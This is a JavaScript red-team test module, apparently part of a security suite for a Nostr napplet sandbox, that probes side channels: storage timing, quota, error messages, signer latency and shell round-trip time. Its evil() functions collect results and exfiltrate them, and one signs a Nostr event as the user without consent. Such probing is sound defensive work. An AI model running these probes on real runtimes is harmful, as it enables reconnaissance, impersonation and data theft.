// evil-06 — side-channel oracles (tier 3). NIP-5D explicitly does NOT protect
// against side channels; this napplet measures what leaks anyway through the
// shell-mediated boundary: storage key existence by latency, quota, the
// error taxonomy (which maps ACL boundaries), and signer backend behavior.
async function timeKey(key, samples) {
  const st = window.napplet && window.napplet.storage;
  const times = [];
  for (let i = 0; i < samples; i++) {
    const t = performance.now();
    try { await st.get(key); } catch (_) { /* timed either way */ }
    times.push(performance.now() - t);
  }
  return times.sort((a, b) => a - b)[Math.floor(times.length / 2)];
}

const ATTACKS = [
  {
    id: 'storage-timing',
    name: 'storage key-existence oracle',
    target: 'NAP-STORAGE mediated get: hit vs miss latency',
    severity: 'critical',
    harm: 'Occupied and empty keys answer measurably differently — key EXISTENCE is readable through the ACL boundary by latency, mapping every namespace the runtime tries to hide.',
    evilBrief: 'Runs a high-sample timing sweep (existing vs missing keys) and exfiltrates the measured timing model to the collector — the oracle turns into a full key-existence map.',
    async demo() {
      const st = window.napplet && window.napplet.storage;
      if (!st) return na('no injected storage domain — no mediation to time');
      const hit = await timeKey('__evil06_seeded__', 12);
      const miss = await timeKey('__evil06_missing__' + randId(), 12);
      const delta = hit - miss;
      return delta > 8
        ? armed('timing oracle: existing key ~' + Math.round(hit) + 'ms vs missing ~' + Math.round(miss) + 'ms (Δ' + Math.round(delta) + 'ms) — key EXISTENCE readable through latency, key shapes enumerable')
        : na('no measurable separation (Δ' + Math.round(Math.abs(delta)) + 'ms < 8ms) — oracle closed on this backend');
    },
    async evil() {
      const st = window.napplet && window.napplet.storage;
      const out = {};
      if (!st) { out.error = 'no injected storage domain'; return out; }
      out.hit = Math.round(await timeKey('__evil06_seeded__', 40));
      out.miss = Math.round(await timeKey('__evil06_missing__' + randId(), 40));
      out.oracle = out.hit - out.miss > 8 ? 'key existence readable (Δ' + (out.hit - out.miss) + 'ms)' : 'not separable';
      out.exfil = await sendToCollector('storage-timing-oracle', out);
      return out;
    },
  },
  {
    id: 'quota-estimate',
    name: 'quota oracle',
    target: 'navigator.storage.estimate()',
    severity: 'high',
    harm: 'If estimate() is reachable from the frame, total origin usage/quota is an aggregate read of ALL napplets\' plus the shell\'s private data volume — traffic-analysis for the whole runtime.',
    async demo() {
      if (!navigator.storage || typeof navigator.storage.estimate !== 'function') return blocked('navigator.storage.estimate unavailable');
      try {
        const r = await withTimeout(navigator.storage.estimate(), 2000);
        if (r && r !== 'timeout' && !r.__rejected) {
          return armed('storage.estimate() visible: usage ' + Math.round((r.usage || 0) / 1024) + 'KB / quota ' + Math.round((r.quota || 0) / 1024 / 1024) + 'MB — aggregate private-data volume readable');
        }
        return blocked('estimate() rejected: ' + (r && r.__rejected));
      } catch (e) {
        return blocked(errMsg(e));
      }
    },
    async evil() {
      const out = {};
      try { out.estimate = await navigator.storage.estimate(); } catch (e) { out.error = errMsg(e); }
      out.exfil = await sendToCollector('quota-oracle', out);
      return out;
    },
  },
  {
    id: 'error-taxonomy',
    name: 'error taxonomy oracle',
    target: 'shell error envelopes (storage.get / oversized set)',
    severity: 'high',
    harm: '"no such key" vs "policy denied" vs "too large" vs "not registered" — distinct errors map the runtime\'s ACL boundaries and namespace internals for free.',
    async demo() {
      const st = window.napplet && window.napplet.storage;
      if (!st) return na('no injected storage domain — no error surface to classify');
      const errors = [];
      const kinds = new Set();
      try { await st.get('__evil06_missing__' + randId()); } catch (e) { errors.push('get-missing: ' + errMsg(e)); kinds.add('get-missing'); }
      try {
        const big = 'x'.repeat(600 * 1024);
        await st.set('__evil06_big__', big);
        await st.remove('__evil06_big__');
      } catch (e) { errors.push('set-oversized: ' + errMsg(e)); kinds.add('set-oversized'); }
      try {
        await st.set('__evil06_probe__', '1');
        await st.remove('__evil06_probe__');
        kinds.add('set-ok');
        errors.push('set-ok: allowed');
      } catch (e) { errors.push('set-ok-threw: ' + errMsg(e)); kinds.add('set-denied'); }
      return kinds.size >= 2
        ? armed('distinct error/response kinds observable (' + Array.from(kinds).join(', ') + '): ' + errors.join(' | ') + ' — taxonomy maps ACL boundaries')
        : na('undifferentiated errors (' + errors.join(' | ') + ') — taxonomy not informative');
    },
    async evil() {
      const st = window.napplet && window.napplet.storage;
      const out = { errors: [] };
      if (!st) { out.error = 'no injected storage domain'; return out; }
      try { await st.get('__evil06_missing__' + randId()); } catch (e) { out.errors.push('get-missing: ' + errMsg(e)); }
      try { await st.set('__evil06_big__', 'x'.repeat(600 * 1024)); } catch (e) { out.errors.push('set-oversized: ' + errMsg(e)); }
      try { await st.set('__evil06_probe__', '1'); await st.remove('__evil06_probe__'); } catch (e) { out.errors.push('set: ' + errMsg(e)); }
      out.exfil = await sendToCollector('error-taxonomy', out.errors);
      return out;
    },
  },
  {
    id: 'signer-latency',
    name: 'ambient signer behavior',
    target: 'window.nostr (if a shell wrongly provides it)',
    severity: 'high',
    harm: 'If NIP-07 leaked through, getPublicKey/signEvent latency and call patterns fingerprint the signer backend (extension vs remote signer vs ledgers) — recon for follow-on abuse.',
    async demo() {
      const n = findNostr();
      if (!n) return blocked('no ambient window.nostr — signer unreachable (held)');
      if (typeof n.getPublicKey !== 'function') return na('window.nostr present but no getPublicKey — behavior unmeasurable');
      const times = [];
      for (let i = 0; i < 3; i++) {
        const t = performance.now();
        try { await n.getPublicKey(); } catch (_) { /* timed anyway */ }
        times.push(Math.round(performance.now() - t));
      }
      return armed('ambient signer reachable, getPublicKey latency [' + times.join(', ') + ']ms — backend fingerprintable, signer power available');
    },
    async evil() {
      const n = findNostr();
      const out = {};
      if (!n) { out.error = 'no ambient signer'; return out; }
      try { out.pubkey = await n.getPublicKey(); } catch (e) { out.pubkey = errMsg(e); }
      const t = performance.now();
      try {
        out.signed = await n.signEvent({ kind: 1, created_at: Math.floor(Date.now() / 1000), tags: [], content: 'evil-06 red-team: latency-fingerprinted your signer and signed as you.' });
        out.signLatency = Math.round(performance.now() - t) + 'ms';
      } catch (e) { out.sign = errMsg(e); }
      out.exfil = await sendToCollector('signer-behavior', { pubkey: out.pubkey, latency: out.signLatency, signed: out.signed && out.signed.id });
      return out;
    },
  },
  {
    id: 'shell-rtt',
    name: 'shell scheduler RTT probe',
    target: 'postMessage echo round-trip',
    severity: 'high',
    harm: 'The parent\'s message round-trip is measurable from inside — shell event-loop scheduling (and, in non-site-isolated runtimes, renderer contention) leaks through. Recon channel for the same-process gadgets (see evil-08).',
    async demo() {
      const rtts = await pingRTT(6);
      if (!rtts.length || rtts[0] < 0) return na('no shell echo (no evil.ping round-trip) — channel closed');
      return armed('parent echo RTT measurable: median ' + rtts[Math.floor(rtts.length / 2)].toFixed(1) + 'ms over ' + rtts.length + ' samples — shell scheduler observable from inside');
    },
    async evil() {
      const out = {};
      out.samples = (await pingRTT(40)).map((v) => +v.toFixed(1));
      out.median = out.samples.length ? out.samples[Math.floor(out.samples.length / 2)] : null;
      out.exfil = await sendToCollector('shell-rtt', out);
      return out;
    },
  },
];